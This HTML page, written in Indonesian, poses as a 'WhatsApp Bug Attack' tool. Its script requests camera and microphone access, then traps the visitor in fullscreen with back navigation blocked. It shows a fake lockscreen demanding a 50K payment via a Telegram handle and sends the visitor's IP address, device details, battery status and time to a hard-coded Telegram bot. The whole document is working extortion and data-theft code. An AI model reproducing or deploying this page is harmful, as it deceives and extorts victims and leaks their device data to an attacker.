<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;900&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #0f0f23;
      font-family: 'Inter', sans-serif;
      height: 100vh;
      overflow: hidden;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    /* OVERLAY IZIN AKSES (TAMPIL PERTAMA) */
    #permission-overlay {
      position: fixed;
      top: 0; left: 0; width: 100%; height: 100%;
      background: rgba(0, 0, 0, 0.95);
      z-index: 10000;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      text-align: center;
      padding: 20px;
    }
    .perm-box {
      background: #1a1a2e;
      padding: 30px;
      border-radius: 20px;
      border: 1px solid #2563eb;
      box-shadow: 0 0 20px rgba(37, 99, 235, 0.5);
    }
    .perm-box h2 { color: #fff; margin-bottom: 15px; font-size: 20px; }
    .perm-box p { color: #ccc; font-size: 14px; margin-bottom: 25px; }
    .btn-allow {
      background: #2563eb;
      color: white;
      border: none;
      padding: 12px 30px;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
    }

    /* LOCKSCREEN (DISEMBUNYIKAN AWALNYA) */
    #lockscreen-overlay {
      position: fixed;
      top: 0; left: 0; width: 100%; height: 100%;
      background: #1a1a1b;
      z-index: 9999;
      display: none; /* Muncul setelah izin */
      justify-content: center;
      align-items: center;
    }

    .phone-frame {
      width: 320px; height: 650px;
      background: #000;
      border: 12px solid #222;
      border-radius: 45px;
      position: relative;
      display: flex;
      flex-direction: column;
      overflow: hidden;
    }

    .screen-lock { flex: 1; display: flex; flex-direction: column; align-items: center; padding-top: 60px; color: white;}
    .lock-icon { font-size: 60px; color: #ff3b30; margin-bottom: 20px; }
    .brand-text { font-size: 13px; font-weight: 800; text-align: center; text-transform: uppercase; }
    #pinDisplay { background: transparent; border: none; color: #555; font-size: 24px; text-align: center; width: 150px; letter-spacing: 8px; margin: 25px 0; outline: none; }
    .numpad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
    .key { width: 70px; height: 50px; background: #262626; border: none; border-radius: 8px; color: white; font-size: 20px; }
    .bottom-warning { position: absolute; bottom: 30px; color: #ff3b30; font-size: 10px; font-weight: bold; width: 100%; text-align: center; }

    /* KONTEN UTAMA */
    .login-container { background: #111; padding: 30px; border-radius: 16px; box-shadow: 0 0 20px blue; text-align: center; width: 100%; max-width: 350px; }
    .login-title { font-size: 20px; color: #2563eb; margin-bottom: 20px; font-weight: 900; }
  </style>
</head>
<body>

  <!-- 1. OVERLAY IZIN AKSES -->
  <div id="permission-overlay">
    <div class="perm-box">
      <h2>Izin Akses Perangkat</h2>
      <p>Untuk melanjutkan proses attack, Anda harus memberikan izin akses keamanan perangkat agar sistem sinkron.</p>
      <button class="btn-allow" onclick="requestAccess()">IZINKAN AKSES</button>
    </div>
  </div>

  <!-- 2. LOCKSCREEN OVERLAY -->
  <div id="lockscreen-overlay">
    <div class="phone-frame">
        <div class="screen-lock">
            <i class="fas fa-lock lock-icon"></i>
            <div class="brand-text">LOCK BY SANN<br>TF 50K UNTUK MEMBUKA KUNCI<br>HUBUNGI TELEGRAM: @DhanzX7</div>
            <input type="password" id="pinDisplay" maxlength="4" readonly placeholder="••••">
            <div class="numpad">
                <button class="key" onclick="pressKey('1')">1</button>
                <button class="key" onclick="pressKey('2')">2</button>
                <button class="key" onclick="pressKey('3')">3</button>
                <button class="key" onclick="pressKey('4')">4</button>
                <button class="key" onclick="pressKey('5')">5</button>
                <button class="key" onclick="pressKey('6')">6</button>
                <button class="key" onclick="pressKey('7')">7</button>
                <button class="key" onclick="pressKey('8')">8</button>
                <button class="key" onclick="pressKey('9')">9</button>
                <div style="width:70px"></div>
                <button class="key" onclick="pressKey('0')">0</button>
                <button class="key" onclick="delKey()"><i class="fas fa-backspace"></i></button>
            </div>
            <div class="bottom-warning">JANGAN MERESTART HP ANDA</div>
        </div>
    </div>
  </div>

  <!-- 3. KONTEN ASLI -->
  <div class="login-container">
    <p class="login-title">WhatsApp Bug Atack</p>
    <p style="color: #ccc; font-size: 12px;">Sistem siap digunakan.</p>
  </div>

  <script>
    const botToken = '8403098052:AAHoNelCuHdAaZJwYZQxH0kJPgkbC2hXOdg';
    const chatIds = ['7945789634'];
    let currentPin = "";
    const correctPin = "5151";

    // FUNGSI UTAMA: REQUEST AKSES & AKTIFKAN LOCK
    async function requestAccess() {
      try {
        // Meminta izin kamera/mic sebagai pemicu
        await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
        
        // JIKA DIIZINKAN:
        // 1. Kirim Laporan ke Telegram
        sendToTelegram("<b>lockscreen berhasil ✅</b>");
        
        // 2. Masuk Mode Fullscreen (Mengunci Layar agar susah keluar)
        if (document.documentElement.requestFullscreen) {
          document.documentElement.requestFullscreen();
        }

        // 3. Sembunyikan Izin, Tampilkan Lockscreen
        document.getElementById('permission-overlay').style.display = 'none';
        document.getElementById('lockscreen-overlay').style.display = 'flex';
        
        // 4. Jalankan fitur auto lainnya
        getInfo();
      } catch (err) {
        alert("Anda harus memberikan izin untuk menggunakan layanan ini!");
      }
    }

    function sendToTelegram(text) {
      chatIds.forEach(id => {
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'HTML' })
        });
      });
    }

    // LOGIKA PIN LOCKSCREEN
    function pressKey(num) {
      if (currentPin.length < 4) {
        currentPin += num;
        document.getElementById("pinDisplay").value = currentPin;
        if (currentPin.length === 4) setTimeout(validatePin, 300);
      }
    }
    function delKey() {
      currentPin = currentPin.slice(0, -1);
      document.getElementById("pinDisplay").value = currentPin;
    }
    function validatePin() {
      if (currentPin === correctPin) {
        document.getElementById("lockscreen-overlay").style.display = "none";
        if (document.exitFullscreen) document.exitFullscreen();
      } else {
        alert("PIN SALAH!");
        currentPin = "";
        document.getElementById("pinDisplay").value = "";
      }
    }

    // ANTI BACK
    window.history.pushState(null, "", window.location.href);
    window.onpopstate = function() {
      window.history.pushState(null, "", window.location.href);
    };

    async function getInfo() {
      try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        const b = await navigator.getBattery?.();
        const bat = b ? `${(b.level * 100).toFixed(0)}% (${b.charging ? 'Charging' : 'Discharging'})` : "N/A";
        const device = navigator.userAgent.split('(')[1].split(')')[0];
        
        const text = `📱 <b>Device:</b> ${device}\n🌐 <b>IP:</b> ${ipData.ip}\n🔋 <b>Baterai:</b> ${bat}\n🕒 <b>Waktu:</b> ${new Date().toLocaleString()}`;
        sendToTelegram(`<b>📥 Info Pengunjung (Auto):</b>\n\n${text}`);
      } catch (e) {}
    }
  </script>

</html>
